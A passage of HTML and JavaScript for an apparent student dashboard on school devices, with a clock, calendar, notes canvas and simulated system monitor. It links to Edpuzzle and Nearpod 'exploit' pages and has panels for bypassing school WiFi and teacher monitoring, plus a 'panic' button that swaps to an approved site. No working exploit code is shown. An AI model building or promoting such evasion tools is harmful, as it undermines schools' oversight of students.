                      <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank">Edpuzzle Exploit</a>
                      <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank">Nearpod Exploit</a>
                    </div>
                  </div>
            
                  <!-- Bypass Panel -->
                  <div id="bypassPanel" class="info-panel">
                    <h2>🚪 Bypassing Tools</h2>
                    <div class="bypass-buttons">
                      <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
                      <button onclick="dashboard.showBypassContent('wifi')">WiFi Bypass</button>
                      <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
                      <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
                      <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
                      <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
                    </div>
                    <div id="bathroomBypass" class="bypass-content"><p>Requires physical access or specific network configurations.</p></div>
                    <div id="wifiBypass" class="bypass-content"><p>Explore network settings and potential open SSIDs.</p></div>
                    <div id="monitoringBypass" class="bypass-content"><p>May involve browser extensions or specific proxy configurations.</p></div>
                    <div id="coming1Bypass" class="bypass-content"><p>Functionality under development.</p></div>
                    <div id="coming2Bypass" class="bypass-content"><p>Check for updates.</p></div>
                    <div id="coming3Bypass" class="bypass-content"><p>Future bypass techniques will be added.</p></div>
                  </div>
            
                  <!-- VPN Panel -->
                  <div id="vpnPanel" class="info-panel">
                    <h2>🔐 VPN Websites</h2>
                    <div class="links-list">
                      <a href="https://protonvpn.com" target="_blank">ProtonVPN</a>
                      <a href="https://nordvpn.com" target="_blank">NordVPN</a>
                      <a href="https://expressvpn.com" target="_blank">ExpressVPN</a>
                      <a href="https://surfshark.com" target="_blank">Surfshark</a>
                      <a href="https://windscribe.com" target="_blank">Windscribe</a>
                    </div>
                  </div>
            
                  <!-- Gaming Panel -->
                  <div id="gamingPanel" class="info-panel">
                    <h2>🎮 Gaming Websites</h2>
                    <div class="coming-soon">Gaming portals coming soon! Stay tuned.</div>
                  </div>
            
                  <!-- Music Panel -->
                  <div id="musicPanel" class="info-panel">
                    <h2>🎵 Music Websites</h2>
                    <div class="coming-soon">Curated music platforms will be listed shortly.</div>
                  </div>
            
                  <!-- Keyboard Panel -->
                  <div id="keyboardPanel" class="info-panel">
                    <h2>🎹 Keyboard Tricks & Shortcuts</h2>
                    <div class="info-text">
                      <p><strong>General System Shortcuts:</strong></p>
                      <ul>
                          <li><strong>Spotlight Search:</strong> <kbd>⌘</kbd> + <kbd>Spacebar</kbd></li>
                          <li><strong>Return to Home:</strong> <kbd>⌘</kbd> + <kbd>H</kbd></li>
                          <li><strong>Show Dock:</strong> <kbd>⌘</kbd> + <kbd>⌥</kbd> + <kbd>D</kbd></li>
                          <li><strong>Show App Library:</strong> <kbd>⇧</kbd> + <kbd>Globe</kbd> + <kbd>A</kbd></li>
                          <li><strong>Quick Note:</strong> <kbd>Globe</kbd> + <kbd>Q</kbd></li>
                          <li><strong>Siri:</strong> <kbd>Globe</kbd> + <kbd>S</kbd></li>
                          <li><strong>Control Center:</strong> <kbd>Globe</kbd> + <kbd>C</kbd></li>
                          <li><strong>Notification Center:</strong> <kbd>Globe</kbd> + <kbd>N</kbd></li>
                          <li><strong>Show All Windows:</strong> <kbd>Globe</kbd> + <kbd>↓ Arrow</kbd></li>
                          <li><strong>Open App Switcher:</strong> <kbd>Globe</kbd> + <kbd>↑ Arrow</kbd></li>
                      </ul>
                      <p><strong>Multitasking Shortcuts:</strong></p>
                      <ul>
                          <li><strong>Switch Apps:</strong> <kbd>⌘</kbd> + <kbd>Tab</kbd></li>
                          <li><strong>Split View Left:</strong> <kbd>⌃</kbd> + <kbd>Globe</kbd> + <kbd>← Arrow</kbd></li>
                          <li><strong>Split View Right:</strong> <kbd>⌃</kbd> + <kbd>Globe</kbd> + <kbd>→</ Arrow</kbd></li>
                          <li><strong>Slide Over Window:</strong> <kbd>Option</kbd> + <kbd>Globe</kbd> + <kbd>←/→</ Arrow</kbd></li>
                      </ul>
                      <p><strong>Safari & App Shortcuts:</strong></p>
                      <ul>
                          <li><strong>New Tab:</strong> <kbd>⌘</kbd> + <kbd>T</kbd></li>
                          <li><strong>Private Tab:</strong> <kbd>⌘</kbd> + <kbd>⇧</kbd> + <kbd>N</kbd></li>
                          <li><strong>Close Tab:</strong> <kbd>⌘</kbd> + <kbd>W</kbd></li>
                          <li><strong>Reopen Last Tab:</strong> <kbd>⇧</kbd> + <kbd>⌘</kbd> + <kbd>T</kbd></li>
                          <li><strong>Go to Tab (1-8):</strong> <kbd>⌘</kbd> + <kbd>(1-8)</kbd></li>
                      </ul>
                      <p><em>Press and hold the <kbd>Command (⌘)</kbd> key to see app-specific shortcuts.</em></p>
                    </div>
                  </div>
                </div>
            
                <div id="canvasContainer">
                  <h2>🖌️ Notes Canvas</h2>
                  <canvas id="notesCanvas" width="600" height="400"></canvas>
                  <div id="canvasControls">
                    <button id="clearCanvasBtn">Clear Canvas</button>
                    <button id="closeCanvasBtn">Close Notes</button>
                  </div>
                </div>
            </div> <!-- End Dashboard Home Section -->

            <!-- System Monitor Section -->
            <div id="monitorSection" class="content-section">
                <h2><i class="fas fa-server"></i> System Monitor</h2>
                <div class="system-monitor-container">
                    <div class="monitor-box">
                        <h3><i class="fas fa-microchip"></i> CPU Usage</h3>
                        <div class="progress-bar-label"><span>Core 1:</span><span>0%</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="cpu1"></div>
                        </div>
                        <div class="progress-bar-label"><span>Core 2:</span><span>0%</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="cpu2"></div>
                        </div>
                        <div class="progress-bar-label"><span>Overall:</span><span>0%</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="cpu_total"></div>
                        </div>
                    </div>
                    <div class="monitor-box">
                        <h3><i class="fas fa-memory"></i> RAM Usage</h3>
                        <div class="progress-bar-label"><span>Total:</span><span>0 GB</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="ram_total"></div>
                        </div>
                        <div class="progress-bar-label"><span>Used:</span><span>0 GB</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="ram_used"></div>
                        </div>
                        <div class="progress-bar-label"><span>Free:</span><span>0 GB</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="ram_free"></div>
                        </div>
                    </div>
                    <div class="monitor-box">
                        <h3><i class="fas fa-hdd"></i> Disk Usage</h3>
                        <div class="progress-bar-label"><span>System Drive (C:):</span><span>0%</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="disk_c"></div>
                        </div>
                        <div class="progress-bar-label"><span>Data Drive (D:):</span><span>0%</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="disk_d"></div>
                        </div>
                    </div>
                    <div class="monitor-box">
                        <h3><i class="fas fa-network-wired"></i> Network I/O</h3>
                        <div class="progress-bar-label"><span>Download:</span><span>0 Mbps</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="net_down"></div>
                        </div>
                        <div class="progress-bar-label"><span>Upload:</span><span>0 Mbps</span></div>
                        <div class="progress-bar-container">
                            <div class="progress-bar" data-metric="net_up"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Terminal Section -->
            <div id="terminalSection" class="content-section">
                <h2><i class="fas fa-terminal"></i> System Terminal</h2>
                <div class="terminal-container">
                    <div class="terminal-output" id="terminalOutput"></div>
                    <div class="terminal-input-line">
                        <span class="terminal-prompt">user@system:~$</span>
                        <input type="text" id="terminalInput" class="terminal-input" placeholder="Type command here..." autocomplete="off">
                    </div>
                </div>
            </div>

            <!-- File Manager Section -->
            <div id="filemanagerSection" class="content-section">
                <h2><i class="fas fa-folder-open"></i> File Manager</h2>
                <div class="file-manager-container">
                    <div class="file-browser">
                        <h3><i class="fas fa-folder"></i> Root Directory</h3>
                        <ul class="file-list" id="fileListRoot">
                            <li class="folder" data-path="/"><i class="fas fa-folder"></i> /</li>
                        </ul>
                    </div>
                    <div class="file-browser" style="flex: 1 1 400px;">
                        <h3><i class="fas fa-file-alt"></i> File Preview</h3>
                        <div class="coming-soon" id="filePreview">Select a file to preview...</div>
                    </div>
                </div>
            </div>

            <!-- Process Manager Section -->
            <div id="processesSection" class="content-section">
                <h2><i class="fas fa-cogs"></i> Process Manager</h2>
                <div class="process-manager-container">
                    <table class="process-table">
                        <thead>
                            <tr>
                                <th>PID</th>
                                <th>Name</th>
                                <th>CPU %</th>
                                <th>Memory</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="processTableBody">
                            <!-- Process rows will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Reminders Section -->
            <div id="remindersSection" class="content-section">
                <h2><i class="fas fa-bell"></i> Reminders</h2>
                <div class="reminders-container">
                    <div class="reminder-form">
                        <input type="text" id="reminderText" placeholder="Enter reminder text..." required>
                        <input type="datetime-local" id="reminderDateTime" required>
                        <button id="addReminderBtn">Add Reminder</button>
                    </div>
                    <div class="reminder-list" id="reminderList">
                        <!-- Reminder items will be added here -->
                    </div>
                </div>
            </div>

            <!-- Advanced Tools Section -->
            <div id="toolsSection" class="content-section">
                <h2><i class="fas fa-tools"></i> Advanced Tools</h2>
                <div class="advanced-tools-panel">
                    <div class="tool-grid">
                        <div class="tool-item">
                            <h4><i class="fas fa-shield-alt"></i> Security Scanner</h4>
                            <p>Scan for potential vulnerabilities.</p>
                            <button onclick="dashboard.runTool('securityScanner')">Run Scan</button>
                        </div>
                        <div class="tool-item">
                            <h4><i class="fas fa-network-check"></i> Network Analyzer</h4>
                            <p>Check network connectivity and latency.</p>
                            <button onclick="dashboard.runTool('networkAnalyzer')">Analyze</button>
                        </div>
                        <div class="tool-item">
                            <h4><i class="fas fa-robot"></i> Automation Suite</h4>
                            <p>Automate repetitive tasks.</p>
                            <button onclick="dashboard.runTool('automationSuite')">Launch Suite</button>
                        </div>
                        <div class="tool-item">
                            <h4><i class="fas fa-terminal"></i> Custom Scripting</h4>
                            <p>Execute custom shell scripts.</p>
                            <a href="#terminalSection">Open Terminal</a>
                        </div>
                        <div class="tool-item">
                            <h4><i class="fas fa-file-contract"></i> Document Manager</h4>
                            <p>Organize and manage system documents.</p>
                            <button onclick="dashboard.runTool('documentManager')">Open Manager</button>
                        </div>
                        <div class="tool-item">
                            <h4><i class="fas fa-server"></i> Virtual Machine</h4>
                            <p>Launch a simulated VM environment.</p>
                            <button onclick="dashboard.runTool('virtualMachine')">Launch VM</button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Settings Panel -->
            <div id="settingsSection" class="content-section">
                <h2><i class="fas fa-cog"></i> System Settings</h2>
                <div class="settings-panel">
                    <div class="setting-item">
                        <div class="setting-label">Dark Mode</div>
                        <div class="setting-control">
                            <input type="checkbox" id="settingsThemeToggle" checked>
                        </div>
                    </div>
                    <div class="setting-item">
                        <div class="setting-label">Notification Sounds</div>
                        <div class="setting-control">
                            <input type="checkbox" id="settingsSoundToggle" checked>
                        </div>
                    </div>
                    <div class="setting-item">
                        <div class="setting-label">Auto-Hide Panels</div>
                        <div class="setting-control">
                            <input type="checkbox" id="settingsAutoHide">
                        </div>
                    </div>
                    <div class="setting-item">
                        <div class="setting-label">Default Zoom Level</div>
                        <div class="setting-control">
                            <select id="settingsZoomLevel">
                                <option value="1">100%</option>
                                <option value="0.9">90%</option>
                                <option value="0.8">80%</option>
                                <option value="1.1">110%</option>
                                <option value="1.2">120%</option>
                            </select>
                        </div>
                    </div>
                    <div class="setting-item">
                        <div class="setting-label">Interface Theme Color</div>
                        <div class="setting-control">
                            <select id="settingsThemeColor">
                                <option value="#ff914d">Orange</option>
                                <option value="#00ffff">Cyan</option>
                                <option value="#00ff00">Green</option>
                                <option value="#ff00ff">Magenta</option>
                                <option value="#ffff00">Yellow</option>
                            </select>
                        </div>
                    </div>
                    <div class="setting-item">
                        <div class="setting-label">Clear All Logs</div>
                        <div class="setting-control">
                            <button id="clearAllLogsBtn">Clear Logs</button>
                        </div>
                    </div>
                </div>
            </div>

        </div> <!-- End Content Area -->
    </div> <!-- End Main Content Wrapper -->

  </div> <!-- End Dashboard -->

  <script>
    // --- Preloader Logic ---
    const preloaderOverlay = document.getElementById('preloaderOverlay');
    const preloaderScreen1 = document.getElementById('preloaderScreen1');
    const preloaderBar1 = document.getElementById('preloaderBar1');
    const preloaderScreen2 = document.getElementById('preloaderScreen2');
    const preloaderBar2 = document.getElementById('preloaderBar2');
    const preloaderScreen3 = document.getElementById('preloaderScreen3');
    const preloaderBar3 = document.getElementById('preloaderBar3');

    let currentProgress = 0;
    let animationInterval;

    function updatePreloaderBar(bar, progress) {
        bar.style.width = `${progress}%`;
    }

    function advancePreloader() {
        if (currentProgress < 100) {
            // Simulate progress
            const increment = Math.random() * 10 + 5; // Add between 5-15%
            currentProgress = Math.min(currentProgress + increment, 100);
            
            if (currentProgress <= 33) {
                updatePreloaderBar(preloaderBar1, currentProgress);
            } else if (currentProgress <= 66) {
                updatePreloaderBar(preloaderBar1, 33); // Keep first bar full
                updatePreloaderBar(preloaderBar2, currentProgress - 33);
            } else {
                updatePreloaderBar(preloaderBar1, 33);
                updatePreloaderBar(preloaderBar2, 33);
                updatePreloaderBar(preloaderBar3, currentProgress - 66);
            }
        } else {
            clearInterval(animationInterval);
            // All bars full, transition to next screen
            preloaderScreen1.classList.add('fade-out');
            
            setTimeout(() => {
                preloaderScreen2.style.opacity = '1';
                preloaderScreen2.style.transform = 'translateY(0)';
                // Start second phase progress
                currentProgress = 33; // Reset conceptually for next phase
                animationInterval = setInterval(() => advancePreloaderPhase2(), 100);
            }, 1000); // Match fade-out duration
        }
    }

    function advancePreloaderPhase2() {
        if (currentProgress < 100) {
            const increment = Math.random() * 10 + 5;
            currentProgress = Math.min(currentProgress + increment, 100);
            updatePreloaderBar(preloaderBar2, currentProgress);
        } else {
            clearInterval(animationInterval);
            preloaderScreen2.classList.add('fade-out');
            
            setTimeout(() => {
                preloaderScreen3.style.opacity = '1';
                preloaderScreen3.style.transform = 'translateY(0)';
                // Start third phase progress
                currentProgress = 66; // Reset conceptually for third phase
                animationInterval = setInterval(() => advancePreloaderPhase3(), 100);
            }, 1000);
        }
    }

    function advancePreloaderPhase3() {
        if (currentProgress < 100) {
            const increment = Math.random() * 10 + 5;
            currentProgress = Math.min(currentProgress + increment, 100);
            updatePreloaderBar(preloaderBar3, currentProgress);
        } else {
            clearInterval(animationInterval);
            // Preloader finished, hide it and show dashboard
            preloaderOverlay.classList.add('hidden');
            document.getElementById('loginBox').style.display = 'none'; // Hide login
            document.getElementById('dashboard').style.display = 'flex'; // Show dashboard
            document.body.className = 'dashboard-body'; // Apply dashboard body class
            
            // Initialize dashboard after a short delay to ensure transition
            setTimeout(() => dashboard.init(), 500); 
        }
    }

    // Start the preloader animation
    animationInterval = setInterval(advancePreloader, 150);


    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        console.log("Dashboard Initializing...");
        this.initSidebarNavigation();
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initQuickBarButtons(); // Renamed for clarity
        this.initCanvas();
        this.initPanels();
        this.initNotifications(); // Initialize notification area
        this.initSystemMonitor();
        this.initTerminal();
        this.initFileManager();
        this.initProcessManager();
        this.initReminders();
        this.initSettings();
        console.log("Dashboard Initialization Complete.");
      },
      
      // Initialize Sidebar Navigation
      initSidebarNavigation: function() {
          const sidebarButtons = document.querySelectorAll('.sidebar-nav button');
          const contentSections = document.querySelectorAll('.content-section');

          sidebarButtons.forEach(button => {
              button.addEventListener('click', () => {
                  // Remove active class from all buttons
                  sidebarButtons.forEach(btn => btn.classList.remove('active'));
                  // Add active class to clicked button
                  button.classList.add('active');

                  // Hide all content sections
                  contentSections.forEach(section => section.classList.remove('active'));
                  
                  // Show the corresponding section
                  const sectionId = button.getAttribute('data-section');
                  document.getElementById(`${sectionId}Section`).classList.add('active');
                  
                  console.log(`Navigated to: ${sectionId}`);
                  this.addNotification(`Navigated to ${sectionId.replace(/([A-Z])/g, ' $1').trim()} section.`, 'info');
              });
          });
          console.log("Sidebar navigation initialized.");
      },

      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        this.sessionTimerInterval = setInterval(updateSessionTime, 1000); // Store interval ID
        console.log("Session timer initialized.");
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        this.clockInterval = setInterval(updateClock, 1000); // Store interval ID
        console.log("Real-time clock initialized.");
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          div.classList.add('empty'); // Mark header days as empty for styling consistency
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDayOfMonth = new Date(year, month, 1);
        const firstDayOfWeek = firstDayOfMonth.getDay(); // 0 for Sunday, 6 for Saturday
        const daysInMonth = new Date(year, month + 1, 0).getDate();

        // Add empty cells for days before the 1st of the month
        for (let i = 0; i < firstDayOfWeek; i++) {
          const emptyCell = document.createElement('div');
          emptyCell.classList.add('empty');
          calendar.appendChild(emptyCell);
        }

        // Add days of the month
        for (let day = 1; day <= daysInMonth; day++) {
          const cell = document.createElement('div');
          cell.innerText = day;
          cell.dataset.date = `${year}-${String(month + 1).padStart(2, '0')}-${String(day).padStart(2, '0')}`; // Data attribute for date
          
          if (day === today && month === date.getMonth() && year === date.getFullYear()) {
              cell.classList.add('today');
          }
          
          cell.addEventListener('click', () => this.selectCalendarDay(cell)); // Add click listener
          calendar.appendChild(cell);
        }
        console.log("Calendar generated.");
      },

      selectCalendarDay: function(dayElement) {
          // Remove 'selected' class from previously selected day
          const previouslySelected = document.querySelector('.calendar div.selected');
          if (previouslySelected) {
              previouslySelected.classList.remove('selected');
          }
          // Add 'selected' class to the clicked day
          dayElement.classList.add('selected');
          
          const dateStr = dayElement.dataset.date;
          if (dateStr) {
              console.log(`Selected date: ${dateStr}`);
              this.addNotification(`Selected date: ${dateStr}`, 'info');
              // Potentially show events or info for that day here
          }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        const settingsThemeToggle = document.getElementById('settingsThemeToggle'); // Link to settings toggle

        const applyThemePreference = (isLight) => {
            document.body.classList.toggle('light-theme', isLight);
            if (isLight) {
                themeBtn.innerHTML = '🌙 Dark Mode';
                settingsThemeToggle.checked = true; // Sync setting
            } else {
                themeBtn.innerHTML = '☀️ Light Mode';
                settingsThemeToggle.checked = false; // Sync setting
            }
        };

        // Load preference from localStorage if available
        const savedTheme = localStorage.getItem('dashboardTheme');
        if (savedTheme) {
            applyThemePreference(savedTheme === 'light');
        }

        themeBtn.addEventListener('click', () => {
            const isLight = document.body.classList.toggle('light-theme');
            applyThemePreference(isLight);
            localStorage.setItem('dashboardTheme', isLight ? 'light' : 'dark');
        });

        // Sync with settings toggle
        settingsThemeToggle.addEventListener('change', () => {
            const isLight = settingsThemeToggle.checked;
            document.body.classList.toggle('light-theme', isLight);
            applyThemePreference(isLight);
            localStorage.setItem('dashboardTheme', isLight ? 'light' : 'dark');
        });
        console.log("Theme toggle initialized.");
      },
      
      // Initialize buttons
      initQuickBarButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          this.addNotification('Panic button activated!', 'warning');
          window.open('https://clever.com', '_blank');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to simulate a system restart? This will refresh the page.')) {
            this.addNotification('System restart initiated.', 'warning');
            // Simulating restart by reloading the page
            window.location.reload();
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          this.addNotification('Running diagnostics...', 'info');
          setTimeout(() => {
            this.addNotification('System diagnostics complete. No critical issues detected.', 'success');
            alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          }, 1500);
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          const elem = document.documentElement;
          if (!document.fullscreenElement) {
            if (elem.requestFullscreen) {
              elem.requestFullscreen();
              this.addNotification('Entered fullscreen mode.', 'info');
            } else if (elem.webkitRequestFullscreen) { /* Safari */
              elem.webkitRequestFullscreen();
              this.addNotification('Entered fullscreen mode.', 'info');
            } else if (elem.msRequestFullscreen) { /* IE11 */
              elem.msRequestFullscreen();
              this.addNotification('Entered fullscreen mode.', 'info');
            }
          } else {
            if (document.exitFullscreen) {
              document.exitFullscreen();
              this.addNotification('Exited fullscreen mode.', 'info');
            } else if (document.webkitExitFullscreen) { /* Safari */ 
              document.webkitExitFullscreen(); 
              this.addNotification('Exited fullscreen mode.', 'info');
            } else if (document.msExitFullscreen) { /* IE11 */
              document.msExitFullscreen(); 
              this.addNotification('Exited fullscreen mode.', 'info');
            }
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
            this.addNotification(`Zoom level increased to ${Math.round(zoomLevel * 100)}%.`, 'info');
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
            this.addNotification(`Zoom level decreased to ${Math.round(zoomLevel * 100)}%.`, 'info');
          }
        });
        console.log("Quick bar buttons initialized.");
      },
      
      // Initialize canvas for notes
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid'); // Dashboard home content
        const contentSections = document.querySelectorAll('.content-section'); // All sections
        const sidebarButtons = document.querySelectorAll('.sidebar-nav button');

        notesBtn.addEventListener('click', () => {
          this.showSection('canvas');
          this.addNotification('Notes canvas opened.', 'info');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          this.showSection('home');
          this.addNotification('Notes canvas closed.', 'info');
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Set initial canvas state
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let currentTool = 'pen'; // Default tool

        // Get mouse/touch position relative to canvas
        function getCanvasPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const touch = evt.touches && evt.touches[0];
          return {
            x: (touch ? touch.clientX : evt.clientX) - rect.left,
            y: (touch ? touch.clientY : evt.clientY) - rect.top
          };
        }

        // Event listeners for drawing
        const startDrawing = (e) => {
            drawing = true;
            const pos = getCanvasPos(e);
            ctx.beginPath();
            ctx.moveTo(pos.x, pos.y);
            e.preventDefault();
        };

        const draw = (e) => {
            if (!drawing) return;
            const pos = getCanvasPos(e);
            ctx.lineTo(pos.x, pos.y);
            
            // Example of dynamic tool/color changing (can be extended)
            ctx.strokeStyle = '#ff914d'; // Default Pen Color
            ctx.lineWidth = 3;
            ctx.lineCap = 'round';
            ctx.lineJoin = 'round';
            ctx.stroke();
            e.preventDefault();
        };

        const stopDrawing = () => {
            drawing = false;
        };

        canvas.addEventListener('mousedown', startDrawing);
        canvas.addEventListener('touchstart', startDrawing, { passive: false });

        canvas.addEventListener('mousemove', draw);
        canvas.addEventListener('touchmove', draw, { passive: false });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, stopDrawing);
        });

        // Clear Canvas Button Functionality
        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          this.addNotification('Notes canvas cleared.', 'info');
        });

        // Screenshot Button Functionality
        document.getElementById('screenshotBtn').addEventListener('click', () => {
          this.addNotification('Capturing dashboard screenshot...', 'info');
          const elementToCapture = document.body; // Capture the whole body
          html2canvas(elementToCapture, { useCORS: true }).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${Date.now()}.png`;
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            this.addNotification('Screenshot saved!', 'success');
          }).catch(err => {
              console.error("Screenshot capture failed:", err);
              this.addNotification('Screenshot capture failed. See console.', 'error');
          });
        });
        
        // Export Notes Canvas Button
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'my_notes.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          this.addNotification('Notes canvas exported as PNG.', 'success');
        });

        // Toggle Sections Button (for home section only)
        document.getElementById('toggleSectionsBtn').addEventListener('click', () => {
          const isCanvasVisible = canvasContainer.style.display === 'block';
          if (isCanvasVisible) { // If we are in canvas mode
            this.showSection('home');
            this.addNotification('Main dashboard sections toggled back.', 'info');
          } else { // If we are in home section
            mainGrid.style.display = mainGrid.style.display === 'none' ? 'grid' : 'none';
            const buttonText = mainGrid.style.display === 'none' ? '⬇️ Toggle Sections' : '⬆️ Toggle Sections';
            document.getElementById('toggleSectionsBtn').innerText = buttonText;
            this.addNotification(`Main dashboard sections visibility toggled: ${mainGrid.style.display === 'grid' ? 'shown' : 'hidden'}.`, 'info');
          }
        });
        console.log("Canvas functionality initialized.");
      },
      
      // Function to show a specific section and hide others
      showSection: function(sectionName) {
          const contentSections = document.querySelectorAll('.content-section');
          contentSections.forEach(section => {
              section.classList.remove('active');
              section.style.display = 'none'; // Hide all by default
          });

          const targetSection = document.getElementById(`${sectionName}Section`);
          if (targetSection) {
              targetSection.classList.add('active');
              targetSection.style.display = 'block'; // Show target section
          }

          // Update sidebar active state
          const sidebarButtons = document.querySelectorAll('.sidebar-nav button');
          sidebarButtons.forEach(btn => {
              if (btn.getAttribute('data-section') === sectionName) {
                  btn.classList.add('active');
              } else {
                  btn.classList.remove('active');
              }
          });
          console.log(`Showing section: ${sectionName}`);
      },

      // Initialize panels (like WiFi, iPad, etc.)
      initPanels: function() {
        // Already set to display: none in CSS
        // Make sure sub-content panels are also hidden
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        console.log("Initial panel states set.");
      },
      
      // Toggle visibility of an info panel
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const isVisible = panel.style.display === 'block';
        panel.style.display = isVisible ? 'none' : 'block';
        
        // Add notification
        this.addNotification(`${panelId.replace('Panel', '').replace(/([A-Z])/g, ' $1').trim()} panel toggled ${isVisible ? 'closed' : 'opened'}.`, 'info');
      },
      
      // Show specific content within iPad panel
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if(targetContent) {
            targetContent.style.display = 'block';
            this.addNotification(`iPad ${contentId} view loaded.`, 'info');
        }
      },
      
      // Show specific content within Bypass panel
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById(contentId + 'Bypass');
        if(targetContent) {
            targetContent.style.display = 'block';
            this.addNotification(`Bypass tool "${contentId}" section loaded.`, 'info');
        }
      },

      // --- Notification System ---
      initNotifications: function() {
          console.log("Notification system initializing.");
          const notificationArea = document.getElementById('notificationArea');
          if (!notificationArea) {
              console.error("Notification area element not found!");
              return;
          }
          // Ensure it's initially visible if needed, or just ready to receive messages
          notificationArea.style.display = 'flex'; // It's a flex container
      },
      
      addNotification: function(message, type = 'info', duration = 5000) { // type: info, success, warning, error
          const notificationArea = document.getElementById('notificationArea');
          if (!notificationArea) return;

          const notificationId = `notif-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
          const notificationElement = document.createElement('div');
          notificationElement.id = notificationId;
          notificationElement.classList.add('notification-item', `notification-${type}`);
          
          let icon = '';
          switch(type) {
              case 'success': icon = '<i class="fas fa-check-circle"></i>'; break;
              case 'warning': icon = '<i class="fas fa-exclamation-triangle"></i>'; break;
              case 'error': icon = '<i class="fas fa-times-circle"></i>'; break;
              default: icon = '<i class="fas fa-info-circle"></i>'; break; // info
          }

          notificationElement.innerHTML = `
              <div class="notification-icon">${icon}</div>
              <div class="notification-content">
                  <div class="notification-message">${message}</div>
                  <div class="notification-time">${new Date().toLocaleTimeString()}</div>
              </div>
              <button class="notification-close" onclick="dashboard.closeNotification('${notificationId}')">&times;</button>
          `;
